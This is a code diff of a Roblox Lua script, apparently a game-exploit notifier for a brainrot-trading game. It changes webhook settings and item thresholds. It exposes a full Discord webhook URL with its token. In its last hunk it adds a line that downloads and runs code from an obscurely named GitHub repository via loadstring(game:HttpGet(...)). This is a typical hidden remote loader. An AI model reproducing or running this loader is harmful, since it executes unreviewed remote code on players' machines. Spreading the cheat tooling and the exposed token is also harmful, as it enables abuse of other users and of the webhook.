@@ -85,7 +85,7 @@ local WEBHOOKS = {
         showJoinerAd = true
     },
     { -- Special brainrots + overpay + mutations
-        url = 'https://discord.com/api/webhooks/1456411952074195051/bdZLaeKaRFCMy3HQOj50RsTq8nn1z18PBkyj_-iKfy1AZ7YK7gvst_Z-yv-lgJfKzOm3',
+        url = 'https://discord.com/api/webhooks/1456411967941120194/5BhYfK-zbqoe_tG7SxHBXysz0IIJj1V4pPXh7LjnZz62vXTv5Z2AWDGT-CGii1xKjTEv',
         title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
         color = 0xff00ff,
         special = true,
@@ -145,10 +145,10 @@ local SPECIAL_BRAINROTS = {
     ['Ginger Gerat'] = { min = 0, mutations = {} },
     ['Jolly Jolly Sahur'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
     ['Skibidi Toilet'] = { min = 0, mutations = {} },
-    ['Tuff Toucan'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Tuff Toucan'] = { min = 500_000_000, mutations = {"Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
     ['Cerberus'] = { min = 0, mutations = {} },
     ['Ay Mi Gatito'] = { min = 0, mutations = {} },
-    ['BRUNITO MARSITO'] = { min = 0, mutations = {} },
+    ['BRUNITO MARSITO'] = { min = 999999999, mutations = {} },
     ['AY MI GATITO MIAU MIAU'] = { min = 0, mutations = {} },
 }
 
@@ -901,4 +901,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ivasdfwfe/wdfesdfaa/refs/heads/main/sdfsdfsdfsdfe1"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/fvddfv"))()
